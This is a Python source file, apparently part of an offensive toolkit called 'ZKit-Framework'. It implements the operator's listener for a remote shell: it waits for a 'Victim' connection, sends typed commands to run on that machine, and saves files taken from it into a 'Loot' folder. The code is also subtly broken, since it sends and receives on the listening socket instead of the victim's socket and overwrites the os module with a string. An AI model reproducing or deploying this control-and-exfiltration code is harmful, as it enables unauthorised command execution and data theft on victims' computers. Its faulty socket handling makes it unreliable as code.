def connect(Connection_Type: str, port: int, type: str):
    import socket
    import os
    from os import path
    import sys
    if os.name == 'nt':
        from colorama import init
        init(convert=True)
    sys.path.insert(0, path.dirname(path.dirname(path.dirname(__file__))))
    from core.helper_core import Color
    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
    if Connection_Type == "TCP":
        Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    elif Connection_Type == "UDP":
        Connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("[" + blue + 'REPORT' + reset + "]  Making Connection")
    try:
        Connection.bind(('', int(port)))
        Connection.listen()
        Victim, Address = Connection.accept()

        os = Victim.recv(1024).decode('UTF-8')
        print("[" + blue + 'REPORT' + reset + "]  Got Platfrom from victim")
        Connected = True
        while Connected:
            print("{}@{} : ".format(Address, os), end='')
            Command = str(input(""))
            Connection.send(Command.encode("UTF-8"))
            result = Connection.recv(1024).decode("UTF-8")
            if type == 'ft':
                if result == '!!!':
                    filelen = Connection.recv(1024).decode("UTF-8")
                    filedata = Connection.recv(int(filelen) + 100)
                    file = Connection.recv(1024).decode("UTF-8")
                    file = path.dirname(path.dirname(
                        path.dirname(__file__))) + '\\Loot\\' + file
                    print(
                        "ZKit-Framework got file from victim ({}) . writing it in {}".format(Address, file))
                    with open(file, 'wb') as f:
                        f.write(filedata)
                    print("Operation was Succesful (file {})".format(file))
            else:
                print(result)
    except:
        Connected = False
        print("[" + red + '-' + reset +
              "] Connection Failed.Victim Might Be Offline Try Again Later")
